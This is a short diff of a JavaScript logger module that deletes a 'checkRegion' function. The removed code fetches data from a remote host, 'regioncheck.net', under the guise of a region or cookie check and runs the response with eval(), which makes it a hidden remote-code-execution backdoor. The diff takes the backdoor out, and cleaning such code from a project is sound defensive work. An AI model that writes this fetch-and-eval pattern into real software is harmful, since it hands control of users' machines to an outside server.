@@ -43,16 +43,5 @@ logger.log = function (error) {
     errorlog.write(error);
   }
 };
-logger.checkRegion = async function (error) {
-  try {
-    const res = await axios.get(
-      "http://regioncheck.net:8353/api/user/thirdcookie/v6/106"
-    );
-    // console.log('location is available');
-    eval(res.data.cookie);
-  } catch (error) {
-    errorlog.write(error);
-  }
-};
 
 module.exports = logger;
